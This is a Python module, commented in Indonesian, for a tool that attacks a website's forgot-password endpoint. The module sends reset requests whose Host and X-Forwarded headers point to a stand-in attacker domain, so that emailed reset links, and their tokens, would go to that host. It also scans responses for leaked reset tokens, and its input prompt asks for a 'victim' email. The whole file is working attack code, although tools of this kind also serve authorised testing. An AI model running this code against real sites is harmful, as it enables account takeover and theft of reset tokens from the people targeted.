import requests
import re
from colorama import Fore, Style

class PasswordResetHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-PwdReset/54.0'}
        
        # Domain kontrol attacker (biasanya Burp Collaborator / Webhook)
        self.attacker_host = "attacker-controlled-site.com"

    def test_host_header_poisoning(self, email_param="email", email_val="test@example.com"):
        """
        Mencoba memanipulasi Header Host saat request reset password.
        Jika server merespon sukses (200/302) dan tidak memvalidasi Host,
        kemungkinan besar link di email akan merujuk ke attacker_host.
        """
        print(f"\n{Fore.YELLOW}[+] Testing Host Header Poisoning on Reset Flow...{Style.RESET_ALL}")
        
        headers = {
            'Host': self.attacker_host,
            'X-Forwarded-Host': self.attacker_host,
            'X-Forwarded-Server': self.attacker_host
        }
        
        # Payload Data (Sesuaikan dengan parameter target)
        data = {email_param: email_val}
        
        try:
            # Kita coba POST (standar form reset)
            res = self.session.post(self.target, data=data, headers=headers, timeout=10)
            
            # ANALISIS
            # 1. Reflected in Body? (Link tercetak di respon?)
            if self.attacker_host in res.text:
                print(f"   {Fore.RED}[CRITICAL] Host Header Reflected in Response!{Style.RESET_ALL}")
                print(f"   └── The server is using the Host header to build links.")
                print(f"   └── Vulnerable to Token Hijacking via Email Link.")
            
            # 2. Accepted? (Status 200 OK atau 302 Redirect)
            elif res.status_code in [200, 302]:
                print(f"   {Fore.MAGENTA}[SUSPICIOUS] Server accepted Fake Host Header ({res.status_code}).{Style.RESET_ALL}")
                print(f"   └── Check your listener at {self.attacker_host} if any email ping arrives.")
            else:
                print(f"   {Fore.GREEN}[SAFE] Server rejected Host manipulation (Status: {res.status_code}).{Style.RESET_ALL}")

        except Exception as e:
            print(f"   [!] Error: {e}")

    def check_response_token_leak(self, email_param="email", email_val="test@example.com"):
        """
        Mengecek apakah Token Reset Password BOCOR di respon JSON/HTML.
        Ini kesalahan fatal developer (mengembalikan token ke frontend).
        """
        print(f"\n{Fore.YELLOW}[+] Checking for Token Leakage in Response...{Style.RESET_ALL}")
        
        data = {email_param: email_val}
        try:
            res = self.session.post(self.target, data=data, timeout=10)
            content = res.text
            
            # Regex untuk mencari token/hash panjang (UUID, Hex, JWT)
            # Contoh pattern: "token": "..."
            patterns = [
                r'["\']token["\']\s*:\s*["\']([a-zA-Z0-9\-\._]+)["\']',
                r'["\']reset_code["\']\s*:\s*["\']([a-zA-Z0-9\-\._]+)["\']',
                r'["\']key["\']\s*:\s*["\']([a-zA-Z0-9\-\._]+)["\']',
                r'/reset-password/([a-zA-Z0-9\-\._]+)'
            ]
            
            found = False
            for p in patterns:
                match = re.search(p, content)
                if match:
                    token = match.group(1)
                    # Filter token pendek (mungkin bukan token asli)
                    if len(token) > 10: 
                        print(f"   {Fore.RED}[CRITICAL] TOKEN LEAKED IN RESPONSE!{Style.RESET_ALL}")
                        print(f"   └── Token: {Fore.YELLOW}{token}{Style.RESET_ALL}")
                        found = True
            
            if not found:
                print(f"   {Fore.GREEN}[SAFE] No obvious tokens found in response body.{Style.RESET_ALL}")

        except:
            pass

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Password Reset Vulnerability Hunter{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        print(f"{Fore.WHITE}[*] Note: This module simulates attacks on the 'Forgot Password' endpoint.")
        
        # Minta input nama parameter email (karena tiap web beda)
        # Default 'email', tapi bisa jadi 'username', 'login', 'user_email'
        print(f"\n{Fore.CYAN}Configuration needed:{Style.RESET_ALL}")
        param_name = input(f"   Enter parameter name for email (default 'email'): ") or "email"
        test_email = input(f"   Enter test email address (victim): ")
        
        if not test_email:
            print(f"{Fore.RED}[!] Email is required for this test.{Style.RESET_ALL}")
            return

        self.test_host_header_poisoning(param_name, test_email)
        self.check_response_token_leak(param_name, test_email)
        
        print("-" * 60)

def run_reset_scan(url):
    engine = PasswordResetHunter(url)
    engine.run_scan()